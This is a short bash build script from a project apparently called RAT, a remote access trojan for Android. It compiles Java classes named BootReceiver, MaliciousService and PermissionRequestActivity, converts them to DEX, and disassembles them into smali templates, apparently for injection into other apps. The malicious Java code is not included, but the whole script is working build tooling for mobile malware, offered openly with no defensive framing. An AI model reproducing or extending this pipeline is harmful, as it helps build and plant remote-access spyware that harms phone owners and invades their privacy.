#!/bin/bash

# Set paths
JAVA_SRC_DIR="/workspace/RAT/src_java"
COMPILED_CLASSES_DIR="/workspace/RAT/src_java/compiled_classes"
ANDROID_JAR="/workspace/RAT/android-14/android.jar"
JSON_JAR="/workspace/RAT/libs/json-20250517.jar"
DEX_OUTPUT_DIR="/workspace/RAT/src_java/dex_output"
SMALI_TEMPLATES_DIR="/workspace/RAT/smali_templates"

# Create directories if they don't exist
mkdir -p "$COMPILED_CLASSES_DIR"
mkdir -p "$DEX_OUTPUT_DIR"

# Step 1: Compile Java files
echo "Compiling Java files..."
javac -d "$COMPILED_CLASSES_DIR" -cp "$ANDROID_JAR:$JSON_JAR" \
    "$JAVA_SRC_DIR/com/example/android/BootReceiver.java" \
    "$JAVA_SRC_DIR/com/example/android/LauncherActivity.java" \
    "$JAVA_SRC_DIR/com/example/android/MaliciousService.java" \
    "$JAVA_SRC_DIR/com/example/android/PermissionRequestActivity.java"

if [ $? -ne 0 ]; then
    echo "Error: Java compilation failed"
    exit 1
fi

# Step 2: Create JAR file
echo "Creating JAR file..."
cd "$COMPILED_CLASSES_DIR"
jar -cvf compiled_rat_classes.jar -C . com/example/android
cd - > /dev/null

if [ $? -ne 0 ]; then
    echo "Error: JAR creation failed"
    exit 1
fi

# Step 3: Convert JAR to DEX
echo "Converting JAR to DEX..."
/workspace/RAT/d8 --output "$DEX_OUTPUT_DIR" "$COMPILED_CLASSES_DIR/compiled_rat_classes.jar" --lib "$ANDROID_JAR" --lib "$JSON_JAR"

if [ $? -ne 0 ]; then
    echo "Error: D8 conversion failed"
    exit 1
fi

# Step 4: Disassemble DEX to Smali
echo "Disassembling DEX to Smali..."
java -jar /workspace/RAT/baksmali.jar disassemble "$DEX_OUTPUT_DIR/classes.dex" -o "$SMALI_TEMPLATES_DIR"

if [ $? -ne 0 ]; then
    echo "Error: Smali disassembly failed"
    exit 1
fi

echo "Compilation process completed successfully!"
echo "Smali templates are available at: $SMALI_TEMPLATES_DIR"